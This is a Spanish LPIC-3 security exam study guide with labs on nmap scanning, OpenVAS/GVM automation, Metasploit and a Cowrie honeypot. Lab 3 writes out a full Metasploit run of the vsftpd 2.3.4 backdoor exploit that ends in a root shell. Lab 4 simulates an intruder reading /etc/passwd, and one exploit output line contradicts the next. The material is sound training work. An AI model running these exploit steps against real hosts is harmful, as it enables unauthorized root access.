# Examen LPIC-3 303-300 (v3.0) — Tema 335 / 6.1: Evaluación de Amenazas y Vulnerabilidades

**Ponderación del examen:** 5 (de 30, aprox. 16.66% del puntaje total del examen)  
**Certificación objetivo:** LPIC-3 Security (303-300, Versión 3.0)  
**Referencia oficial:** 
- [LPI LPIC-3 303 Certification Overview](https://www.lpi.org/our-certifications/lpic-3-303-overview/)
- [LPI Wiki LPIC-303 Objectives V3.0](https://wiki.lpi.org/wiki/LPIC-303_Objectives_V3.0)

---

## Technical Architecture & Core Concepts

La evaluación de amenazas y vulnerabilidades en entornos Enterprise Linux de producción requiere una comprensión profunda de las vulnerabilidades a nivel de host, la mecánica de los vectores de red, los escáneres de seguridad automatizados, las arquitecturas de engaño mediante honeypots y las metodologías estructuradas de penetration testing.

```
                  +-------------------------------------------------------------+
                  |               Active Reconnaissance & Scanning              |
                  |     (Nmap SYN/ACK/UDP, OS Fingerprinting, NSE Engine)     |
                  +------------------------------+------------------------------+
                                                 |
                                                 v
                  +-------------------------------------------------------------+
                  |            Vulnerability Management (OpenVAS / GVM)         |
                  |     (gvmd <-> ospd-openvas <-> openvas-scanner <-> NVTs)    |
                  +------------------------------+------------------------------+
                                                 |
                                                 v
                  +-------------------------------------------------------------+
                  |              Threat Vector & Exploit Analysis               |
                  |   (Metasploit MSF Engine, Privilege Escalation, Payloads)   |
                  +------------------------------+------------------------------+
                                                 |
                                                 v
                  +-------------------------------------------------------------+
                  |             Deception Technology & Telemetry                |
                  |        (Cowrie / Dionaea Honeypots, Syslog/SIEM Routing)    |
                  +-------------------------------------------------------------+
```

### 1. Reconocimiento de red y mecánica de paquetes a bajo nivel (`nmap`)
`nmap` se basa en la manipulación de transiciones de estado TCP, mensajes de control ICMP y flags del encabezado IP para realizar el descubrimiento de hosts, la determinación del estado de los puertos y el OS fingerprinting.

* **TCP SYN Scan (`-sS`):** Conocido como escaneo half-open. `nmap` transmite un paquete TCP SYN en bruto (raw) a un puerto objetivo.
  * Si el objetivo responde con **SYN/ACK**: El puerto está `open`. `nmap` envía inmediatamente un paquete **RST** para cerrar el socket antes de que se complete el 3-way handshake (evadiendo registradores simples a nivel de capa de aplicación).
  * Si el objetivo responde con **RST/ACK**: El puerto está `closed`.
  * Si no hay respuesta o se recibe un ICMP unreachable (Tipo 3, Código 1, 2, 3, 9, 10, 13): El puerto está `filtered`.
* **TCP Connect Scan (`-sT`):** Utiliza la llamada al sistema `connect()` del sistema operativo. Completa el TCP 3-way handshake completo (SYN $\rightarrow$ SYN/ACK $\rightarrow$ ACK) seguido de un `FIN` o `RST` explícito. Se utiliza cuando no se dispone de permisos para sockets en bruto (`CAP_NET_RAW`).
* **TCP Stealth Scans (FIN `-sF`, NULL `-sN`, Xmas `-sX`):** Explotan el cumplimiento del estándar RFC 793 TCP.
  * Los paquetes se envían con combinaciones específicas de flags (Xmas establece `FIN`, `PSH`, `URG`).
  * El RFC 793 establece que los puertos cerrados deben responder con `RST`, mientras que los puertos abiertos deben descartar el paquete silenciosamente.
  * *Compromiso (Trade-off):* Los firewalls stateless y los sistemas operativos no conformes con RFC (como Windows) responden con `RST` independientemente del estado del puerto, lo que hace que estos escaneos dependan del sistema operativo.
* **TCP ACK Scan (`-sA`):** Establece el flag `ACK`. Se utiliza exclusivamente para mapear conjuntos de reglas de firewall y diferenciar entre filtrado de paquetes stateful y stateless. Las respuestas de `RST` indican que el puerto está unfiltered.
* **UDP Scan (`-sU`):** Envía paquetes UDP en bruto a los puertos objetivo.
  * Si se devuelve un ICMP Port Unreachable (Tipo 3, Código 3), el puerto está `closed`.
  * Si se recibe una respuesta UDP, el puerto está `open`.
  * Si no se recibe respuesta después de varios reintentos, el estado se clasifica como `open|filtered`.
  * *Compromiso (Trade-off):* El rate limiting en los mensajes de error ICMP (por ejemplo, el kernel de Linux limitando las respuestas ICMP Tipo 3 a 1 por segundo) hace que el escaneo de rango completo de UDP sea extremadamente lento sin `--min-rate`.

### 2. Arquitectura del motor de evaluación de vulnerabilidades (OpenVAS / GVM)
Greenbone Vulnerability Management (GVM) es una suite de escaneo de vulnerabilidades de nivel empresarial.

* **Componentes y comunicaciones entre demonios:**
  * **`gvmd` (GVM Daemon):** El servicio central de gestión. Implementa el Greenbone Management Protocol (GMP), controla tareas, maneja la autenticación y almacena metadatos en una base de datos PostgreSQL.
  * **`ospd-openvas`:** Open Scanner Protocol Daemon. Actúa como una capa de abstracción que conecta `gvmd` con `openvas-scanner` a través de OSP estándar (XML sobre Unix Socket o TLS).
  * **`openvas-scanner`:** El motor de ejecución en bruto. Carga Network Vulnerability Tests (NVTs) escritos en **NASL (Nessus Attack Scripting Language)**, ejecuta escaneos contra los hosts objetivo y devuelve los resultados a `ospd-openvas`.
  * **`gsa` (Greenbone Security Assistant):** Interfaz web que sirve tráfico HTTPS en el puerto 9392/TCP, comunicándose con `gvmd` a través de GMP.
* **NVTs y gestión de feeds:** Los escáneres se basan en la sincronización de feeds (`greenbone-nvt-sync`, `gvm-feed-update`) para obtener vulnerabilidades CVE actualizadas, definiciones OVAL y avisos CERT.

### 3. Frameworks de penetration testing y mecánica de explotación (Metasploit)
El penetration testing sigue fases estructuradas del ciclo de vida:
$$\text{Reconnaissance} \longrightarrow \text{Enumeration} \longrightarrow \text{Exploitation} \longrightarrow \text{Privilege Escalation} \longrightarrow \text{Persistence} \longrightarrow \text{Covering Tracks}$$

* **Tipos de módulos del Metasploit Framework (`msfconsole`):**
  * **Auxiliary:** Escáneres, crawlers, fuzzers y módulos de denegación de servicio (denial-of-service) que no devuelven una shell.
  * **Exploit:** Código que aprovecha un fallo/vulnerabilidad de software específico para ejecutar código en sistemas objetivo.
  * **Payload:** El código que se ejecuta tras un exploit exitoso. Categorías:
    * *Singles:* Payloads autosuficientes (por ejemplo, `linux/x64/shell_bind_tcp`).
    * *Stagers:* Payloads pequeños que asignan memoria, establecen una conexión de red y descargan un *Stage* más grande.
    * *Stages:* Payloads complejos que proporcionan una interacción avanzada (por ejemplo, `Meterpreter`).
  * **Post:** Módulos que se ejecutan después del acceso inicial para recopilar datos, escalar privilegios o hacer pivot a través de segmentos de red.

---

## Ejercicios de laboratorio práctico guiados

### Laboratorio 1: Reconocimiento de red avanzado, escaneo sigiloso (Stealth Scanning) y scripting personalizado NSE con Nmap

En este laboratorio, realizará una manipulación de paquetes a bajo nivel utilizando `nmap`, evaluará los comportamientos de respuesta del firewall, ejecutará la detección de versiones de servicios y desarrollará un script de Lua personalizado para el Nmap Scripting Engine (NSE) con el fin de auditar los encabezados de seguridad HTTP.

#### Paso 1: Ejecutar escaneos en bruto TCP SYN vs. TCP Connect
Inicie sesión en su estación de trabajo de seguridad Linux (`192.168.56.10`). Ejecute un escaneo TCP SYN y un escaneo TCP Connect contra el nodo objetivo `192.168.56.20`, capturando la temporización de los paquetes y la información de estado de TCP.

```bash
# Execute raw SYN stealth scan with aggressive timing and OS/version detection
sudo nmap -sS -sV -O -p 22,80,443,3306 -T4 --packet-trace 192.168.56.20
```

**Salida esperada del comando:**
```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-06 14:00 UTC
SENT (0.0410s) TCP 192.168.56.10:43210 > 192.168.56.20:22 S ttl=54 id=4123 seq=123456789 win=1024 <mss 1460>
RCVD (0.0418s) TCP 192.168.56.20:22 > 192.168.56.10:43210 SA ttl=64 id=0 seq=987654321 win=64240 <mss 1460>
SENT (0.0420s) TCP 192.168.56.10:43210 > 192.168.56.20:22 R ttl=54 id=4124 seq=123456790 win=0
Nmap scan report for 192.168.56.20
Host is up (0.00080s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
443/tcp  closed https
3306/tcp filtered mysql
MAC Address: 08:00:27:A2:3B:11 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.4 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ahora ejecute un escaneo ACK para inspeccionar las capacidades de filtrado de paquetes en el objetivo:

```bash
sudo nmap -sA -p 22,80,443,3306 192.168.56.20
```

**Salida esperada del comando:**
```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-06 14:01 UTC
Nmap scan report for 192.168.56.20
Host is up (0.00075s latency).

PORT     STATE      SERVICE
22/tcp   unfiltered ssh
80/tcp   unfiltered http
443/tcp  unfiltered https
3306/tcp filtered   mysql

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

#### Paso 2: Desarrollar un script Lua personalizado para el Nmap Scripting Engine (NSE)
Cree un script NSE personalizado sintácticamente válido diseñado para auditar si los servicios HTTP objetivo implementan el encabezado `Strict-Transport-Security` (HSTS).

Escriba el siguiente contenido en `/usr/share/nmap/scripts/http-hsts-check.nse`:

```lua
local http = require("http")
local shortport = require("shortport")
local stdnse = require("stdnse")

description = [[
Audits an HTTP/HTTPS service to verify the presence of the Strict-Transport-Security (HSTS) header.
]]

author = "Production SRE Architect"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}

-- Rule section: trigger on HTTP/HTTPS ports
portrule = shortport.http

-- Action section: execution logic
action = function(host, port)
    local response = http.get(host, port, "/")
    
    if not response then
        return "ERROR: Failed to receive HTTP response."
    end

    local hsts = response.header["strict-transport-security"]

    if hsts then
        return string.format("[SECURE] HSTS Header found: %s", hsts)
    else
        return "[VULNERABLE] HSTS Header is MISSING! Risk of TLS Stripping."
    end
end
```

Actualice la base de datos de scripts de NSE y ejecute su script personalizado:

```bash
sudo nmap --script-updatedb
nmap --script http-hsts-check.nse -p 80,443 192.168.56.20
```

**Salida esperada del comando:**
```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-06 14:05 UTC
Nmap scan report for 192.168.56.20
Host is up (0.00062s latency).

PORT    STATE  SERVICE
80/tcp  open   http
|_http-hsts-check: [VULNERABLE] HSTS Header is MISSING! Risk of TLS Stripping.
443/tcp open  https
|_http-hsts-check: [SECURE] HSTS Header found: max-age=31536000; includeSubDomains; preload

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

---

#### Preguntas de verificación — Laboratorio 1

1. **¿Por qué un escaneo TCP ACK (`-sA`) reporta los puertos como `unfiltered` en lugar de `open` o `closed`?**
2. **En el escaneo TCP SYN (`-sS`), ¿qué secuencia específica de paquetes emite Nmap al recibir una respuesta `SYN/ACK` del host objetivo y qué objetivo de seguridad logra esto?**
3. **¿Cuál es la diferencia estructural entre una `portrule` de NSE definida con `shortport.http` y una `hostrule`?**

---

### Laboratorio 2: Escaneo empresarial de vulnerabilidades con la arquitectura y automatización de OpenVAS / GVM

En este laboratorio, configurará, gestionará y ejecutará escaneos automatizados de vulnerabilidades utilizando la suite Greenbone Vulnerability Management (GVM) a través de utilidades de línea de comandos (`gvm-cli`) y verificará la sincronización del feed de NVTs.

#### Paso 1: Verificar la arquitectura del demonio GVM y el estado del feed
Compruebe los servicios en ejecución del stack de GVM y verifique el estado de la base de datos de Network Vulnerability Tests (NVT).

```bash
# Check status of gvmd, ospd-openvas, and postgresql
systemctl status gvmd ospd-openvas postgresql --no-pager
```

**Salida esperada del comando:**
```text
● gvmd.service - Greenbone Vulnerability Manager daemon (gvmd)
     Loaded: loaded (/lib/systemd/system/gvmd.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2026-08-06 10:00:12 UTC; 4h 0min ago
       Docs: man:gvmd(8)
   Main PID: 1204 (gvmd)
      Tasks: 1 (limit: 4681)
     Memory: 45.2M
        CPU: 1.234s
     CGroup: /system.slice/gvmd.service
             └─1204 gvmd: Waiting for incoming connections

● ospd-openvas.service - OSPD OpenVAS Scanner Daemon
     Loaded: loaded (/lib/systemd/system/ospd-openvas.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2026-08-06 10:00:15 UTC; 4h 0min ago
   Main PID: 1245 (python3)
```

Verifique el estado actual de la base de datos de NVT utilizando `gvmd`:

```bash
sudo -u gvm gvmd --get-scanners
sudo -u gvm gvmd --get-users
```

**Salida esperada del comando:**
```text
08b69003-5fc2-4037-a479-93b440211c73  OpenVAS Default  /var/run/ospd/ospd-openvas.sock  0  OpenVAS Scanner
admin
```

#### Paso 2: Automatizar la creación de tareas de escaneo de vulnerabilidades a través de `gvm-cli`
Utilice `gvm-cli` sobre Unix Socket para generar un objetivo, crear una tarea de escaneo e iniciar la ejecución contra `192.168.56.20`.

```bash
# Generate GMP XML payload to create a scan target
gvm-cli --gmp-username admin --gmp-password "SecurePass123!" socket --xml \
  '<create_target><name>Production Web Cluster</name><hosts>192.168.56.20</hosts><port_list id="4a471842-3567-11e3-a417-406186ea4fc5"/></create_target>'
```

**Salida esperada del comando:**
```xml
<create_target_response status="201" status_text="OK, resource created" id="e7b1a2c3-d4e5-6789-0123-456789abcdef"/>
```

A continuación, cree la tarea de escaneo utilizando el UUID de configuración de escaneo Full and Fast (`daba56c8-73ec-11df-a475-002264764cea`) y el ID del objetivo creado anteriormente:

```bash
gvm-cli --gmp-username admin --gmp-password "SecurePass123!" socket --xml \
  '<create_task><name>Audit Web 192.168.56.20</name><config id="daba56c8-73ec-11df-a475-002264764cea"/><target id="e7b1a2c3-d4e5-6789-0123-456789abcdef"/><scanner id="08b69003-5fc2-4037-a479-93b440211c73"/></create_task>'
```

**Salida esperada del comando:**
```xml
<create_task_response status="201" status_text="OK, resource created" id="a1b2c3d4-e5f6-7890-1234-567890abcdef"/>
```

Inicie la tarea de escaneo creada:

```bash
gvm-cli --gmp-username admin --gmp-password "SecurePass123!" socket --xml \
  '<start_task task_id="a1b2c3d4-e5f6-7890-1234-567890abcdef"/>'
```

**Salida esperada del comando:**
```xml
<start_task_response status="202" status_text="OK, request submitted">
  <report_id>f9e8d7c6-b5a4-3210-0987-654321fedcba</report_id>
</start_task_response>
```

---

#### Preguntas de verificación — Laboratorio 2

1. **En la arquitectura de OpenVAS / GVM, ¿cuál es el rol exacto de `ospd-openvas` y cómo actúa como interfaz entre `gvmd` y `openvas-scanner`?**
2. **¿Qué lenguaje de programación se utiliza para escribir los Network Vulnerability Tests (NVTs) ejecutados por `openvas-scanner`?**

---

### Laboratorio 3: Flujo de trabajo de penetration testing e integración con Metasploit Framework

En este laboratorio, ejecutará un ejercicio estructurado de penetration testing utilizando `msfconsole`. Importará datos de reconocimiento, ejecutará la comprobación de un servicio vulnerable, configurará un exploit con un payload específico e inspeccionará las métricas de la sesión.

> **Aviso legal y ético:** El penetration testing SOLO debe realizarse en redes y hosts en los que posea una autorización explícita y por escrito (Rules of Engagement). Las pruebas no autorizadas son ilegales según las leyes de uso indebido de ordenadores en todo el mundo.

#### Paso 1: Inicializar la base de datos e importar datos de reconocimiento de Nmap en Metasploit
Inicie la base de datos PostgreSQL para Metasploit, ejecute `msfconsole` e importe los resultados del escaneo XML de Nmap.

```bash
sudo systemctl start postgresql
msfconsole -q -x "db_status; db_nmap -sV 192.168.56.20; hosts; services"
```

**Salida esperada del comando:**
```text
[*] Connected to PostgreSQL database name msf_db. Connection type: Connected.
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-06 14:15 UTC
[*] Nmap: Nmap scan report for 192.168.56.20
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     vsftpd 2.3.4
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.41

Hosts
=====
address        mac                os_name  os_flavor  os_sp  purpose  state  name
-------        ---                -------  ---------  -----  -------  -----  ----
192.168.56.20  08:00:27:A2:3B:11  Linux                       server   alive

Services
========
host           port  proto  name  state  info
----           ----  -----  ----  -----  ----
192.168.56.20  21    tcp    ftp   open   vsftpd 2.3.4
192.168.56.20  80    tcp    http  open   Apache httpd 2.4.41
```

#### Paso 2: Configurar los módulos de Exploit y Payload
Seleccione el módulo de exploit `vsftpd_234_backdoor`, configure los parámetros objetivo, seleccione un payload explícito y verifique las opciones del módulo.

```bash
msfconsole -q
```

Dentro de la shell interactiva, ejecute los siguientes comandos:

```text
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.20
RHOSTS => 192.168.56.20
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set CHOST 192.168.56.10
CHOST => 192.168.56.10
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

**Salida esperada del comando:**
```text
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.56.20    yes       Target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)

Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Ejecute el exploit e interactúe con la sesión resultante:

```text
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] 192.168.56.20:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.20:21 - USER name smiley:)
[+] 192.168.56.20:21 - Backdoor service spawned on port 6200.
[*] Command shell session 1 opened (192.168.56.10:44123 -> 192.168.56.20:6200) at 2026-08-06 14:20:11 +0000

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1
[*] Starting interaction with 1.

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux target-node 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 GNU/Linux
```

---

#### Preguntas de verificación — Laboratorio 3

1. **¿Cuál es la diferencia arquitectónica fundamental entre un módulo *Auxiliary* y un módulo *Exploit* de Metasploit?**
2. **¿Cuál es la diferencia entre un payload *Staged* y un payload *Stageless (Single)* en Metasploit, y qué compromiso (trade-off) de red existe entre ellos al atravesar firewalls de salida (egress) estrictos?**

---

### Laboratorio 4: Simulación de amenazas, tecnología de engaño y analítica de honeypots (Cowrie)

En este laboratorio, configurará y desplegará un honeypot SSH/Telnet de interacción baja/media (**Cowrie**), simulará un intento de fuerza bruta de credenciales por parte de un atacante y analizará los registros de telemetría JSON estructurados.

#### Paso 1: Configurar la instancia del honeypot Cowrie
Cree un archivo de configuración sintácticamente válido para Cowrie en `/etc/cowrie/cowrie.cfg` para emular un servidor Linux que ejecuta OpenSSH.

```ini
[honeypot]
hostname = prod-db-01.internal.net
log_path = var/log/cowrie
download_path = var/lib/cowrie/downloads

[shell]
filesystem = share/cowrie/fs.pickle
arch = x86_64
kernel_version = 5.15.0-91-generic
kernel_build = #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023

[ssh]
enabled = true
listen_endpoints = tcp:2222:interface=0.0.0.0
version = SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6

[telnet]
enabled = false
```

Inicie el demonio del honeypot Cowrie:

```bash
sudo -u cowrie /opt/cowrie/bin/cowrie start
sudo -u cowrie /opt/cowrie/bin/cowrie status
```

**Salida esperada del comando:**
```text
Activating virtualenv "/opt/cowrie/cowrie-env"
Cowrie is running as Process ID 14201.
```

#### Paso 2: Simular un ataque externo y analizar la telemetría JSON
Desde su estación de trabajo de atacante (`192.168.56.10`), inicie un intento de inicio de sesión SSH no autorizado al puerto del honeypot (`2222`):

```bash
ssh -p 2222 root@192.168.56.20
```

*Ingrese la contraseña ficticia:* `admin123`

```text
root@192.168.56.20's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

root@prod-db-01:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
root@prod-db-01:~# exit
logout
Connection to 192.168.56.20 closed.
```

Ahora, consulte el archivo de registro estructurado de Cowrie `/var/log/cowrie/cowrie.json` usando `jq` para extraer la secuencia de eventos de la sesión, las credenciales probadas y los comandos ejecutados por el atacante:

```bash
cat /var/log/cowrie/cowrie.json | jq -r '{timestamp: .timestamp, src_ip: .src_ip, eventid: .eventid, username: .username, password: .password, input: .input}' | grep -v 'null'
```

**Salida esperada del comando:**
```json
{
  "timestamp": "2026-08-06T14:35:10.123456Z",
  "src_ip": "192.168.56.10",
  "eventid": "cowrie.login.success",
  "username": "root",
  "password": "admin123"
}
{
  "timestamp": "2026-08-06T14:35:18.654321Z",
  "src_ip": "192.168.56.10",
  "eventid": "cowrie.command.input",
  "input": "cat /etc/passwd"
}
{
  "timestamp": "2026-08-06T14:35:22.987654Z",
  "src_ip": "192.168.56.10",
  "eventid": "cowrie.session.closed"
}
```

---

#### Preguntas de verificación — Laboratorio 4

1. **¿Cuál es la diferencia de clasificación entre un *Low-Interaction Honeypot* (por ejemplo, Cowrie) y un *High-Interaction Honeypot* (por ejemplo, una VM dedicada con un kernel de Linux real y un puente de red físico), y cuáles son los compromisos (trade-offs) de seguridad de cada uno?**
2. **¿Cómo reduce el despliegue de un control de engaño (honeypot/canary) en una red empresarial las tasas de falsos positivos para las alertas de Security Information and Event Management (SIEM)?**

---

<details>
<summary>Respuestas a los ejercicios y clave de verificación</summary>

### Respuestas a las preguntas de verificación del laboratorio 1

1. **¿Por qué un escaneo TCP ACK (`-sA`) reporta los puertos como `unfiltered` en lugar de `open` o `closed`?**  
   *Respuesta:* Un escaneo TCP ACK envía paquetes únicamente con el flag `ACK` establecido. De acuerdo con la especificación del estado TCP (RFC 793), cualquier host activo que reciba un paquete `ACK` no solicitado responderá con un paquete `RST`, independientemente de si el puerto objetivo está `open` o `closed`. Por lo tanto, recibir un `RST` solo demuestra que el paquete atravesó los firewalls/filtros stateful y llegó al host (`unfiltered`). Si no se recibe respuesta, o si ocurre un error ICMP (Tipo 3), Nmap marca el puerto como `filtered`.

2. **En el escaneo TCP SYN (`-sS`), ¿qué secuencia específica de paquetes emite Nmap al recibir una respuesta `SYN/ACK` del host objetivo y qué objetivo de seguridad logra esto?**  
   *Respuesta:* Nmap transmite inmediatamente un paquete `RST` (Reset). Esto interrumpe la conexión TCP embrionaria antes de que se complete el 3-way handshake completo. Debido a que el socket TCP nunca se establece completamente, la capa de aplicación (por ejemplo, Apache, Nginx, OpenSSH) no es notificada de una conexión de socket entrante, evitando la creación de registros en los logs tradicionales de conexión a nivel de aplicación.

3. **¿Cuál es la diferencia estructural entre una `portrule` de NSE definida con `shortport.http` y una `hostrule`?**  
   *Respuesta:* Una `portrule` evalúa criterios por puerto (por ejemplo, comprobar si el puerto está abierto y ejecuta un servicio HTTP) y ejecuta la función `action` de Lua una vez por cada puerto coincidente en un host objetivo. Una `hostrule` evalúa condiciones a nivel de host (por ejemplo, subredes IP de destino, características de la tabla de enrutamiento, respuesta a ICMP) y ejecuta la función `action` una vez por host objetivo, independientemente de los puertos abiertos.

---

### Respuestas a las preguntas de verificación del laboratorio 2

1. **En la arquitectura de OpenVAS / GVM, ¿cuál es el rol exacto de `ospd-openvas` y cómo actúa como interfaz entre `gvmd` y `openvas-scanner`?**  
   *Respuesta:* `ospd-openvas` es una implementación del demonio Open Scanner Protocol (OSP). Actúa como un demonio de comunicación intermediario entre el gestor de alto nivel (`gvmd`) y el escáner de bajo nivel (`openvas-scanner`). `gvmd` envía comandos de escaneo sobre un socket Unix/TLS utilizando solicitudes XML OSP estándar a `ospd-openvas`, que traduce estas directivas, genera y controla procesos de `openvas-scanner`, y devuelve el progreso y los resultados del escaneo a `gvmd`.

2. **¿Qué lenguaje de programación se utiliza para escribir los Network Vulnerability Tests (NVTs) ejecutados por `openvas-scanner`?**  
   *Respuesta:* Los NVTs están escritos en **NASL** (Nessus Attack Scripting Language), un lenguaje de scripting especializado diseñado para construir paquetes de red personalizados, inspeccionar payloads de protocolos, parsear cadenas de versión y verificar vulnerabilidades de forma segura.

---

### Respuestas a las preguntas de verificación del laboratorio 3

1. **¿Cuál es la diferencia arquitectónica fundamental entre un módulo *Auxiliary* y un módulo *Exploit* de Metasploit?**  
   *Respuesta:* Un módulo *Auxiliary* realiza secuencias de acciones como descubrimiento de red, fingerprinting de servicios, fuerza bruta de credenciales o Denegación de Servicio (DoS) sin inyectar código ni establecer un payload de shell remota. Un módulo *Exploit* aprovecha activamente un fallo/vulnerabilidad de software para ejecutar código arbitrario en el objetivo remoto y entregar un *Payload* (como una reverse shell o una sesión de Meterpreter).

2. **¿Cuál es la diferencia entre un payload *Staged* y un payload *Stageless (Single)* en Metasploit, y qué compromiso (trade-off) de red existe entre ellos al atravesar firewalls de salida (egress) estrictos?**  
   *Respuesta:* 
   * Los *payloads Staged* (por ejemplo, `linux/x64/meterpreter/reverse_tcp`) utilizan un payload stub inicial diminuto (Stage 0) inyectado en el proceso objetivo. Este stub se conecta de nuevo al manejador del atacante para obtener el payload binario más grande (Stage 1) en memoria. *Compromiso (Trade-off):* Los payloads Staged tienen una huella de memoria inicial de exploit muy pequeña, pero requieren múltiples transmisiones de red que pueden ser detectadas o bloqueadas por filtrado de salida (egress) / inspección profunda de paquetes (DPI).
   * Los *payloads Stageless (Single)* (por ejemplo, `linux/x64/meterpreter_reverse_tcp`) contienen todo el código de la shell en un único blob ejecutable. *Compromiso (Trade-off):* Ocupan un mayor tamaño en memoria, pero se ejecutan completamente en un solo intento sin necesidad de obtener código adicional a través de la red, lo que los hace más resistentes frente al bloqueo de red multietapa.

---

### Respuestas a las preguntas de verificación del laboratorio 4

1. **¿Cuál es la diferencia de clasificación entre un *Low-Interaction Honeypot* (por ejemplo, Cowrie) y un *High-Interaction Honeypot*, y cuáles son los compromisos (trade-offs) de seguridad de cada uno?**  
   *Respuesta:* 
   * Los *Low/Medium-Interaction Honeypots* (como Cowrie) emulan servicios específicos, shells y respuestas del sistema operativo mediante abstracciones de software falsas sin exponer un kernel real. *Compromisos (Trade-offs):* Extremadamente seguros, bajo uso de recursos, cero riesgo de que el host sea comprometido y utilizado para atacar a terceros; sin embargo, atacantes sofisticados pueden identificar rápidamente las limitaciones de la emulación.
   * Los *High-Interaction Honeypots* utilizan sistemas operativos reales, aplicaciones reales y máquinas virtuales completas. *Compromisos (Trade-offs):* Capturan exploits zero-day completos, rootkits y comportamientos reales de atacantes; sin embargo, requieren un aislamiento complejo tipo sandbox y suponen un alto riesgo: si se comprometen, un atacante podría romper la contención y usar el nodo para lanzar ataques laterales.

2. **¿Cómo reduce el despliegue de un control de engaño (honeypot/canary) en una red empresarial las tasas de falsos positivos para las alertas de Security Information and Event Management (SIEM)?**  
   *Respuesta:* Los honeypots no transportan tráfico operativo legítimo, no tienen usuarios de producción ni comunicaciones autorizadas de servicio a servicio. Por lo tanto, **cualquier interacción** (intento de conexión TCP, ping, solicitud de autenticación) que alcance una dirección de honeypot es inherentemente no autorizada o maliciosa. Las reglas de alerta de SIEM que se activan con la actividad de un honeypot operan cerca de una tasa de falsos positivos cero, lo que permite respuestas de contención automatizadas inmediatas.

</details>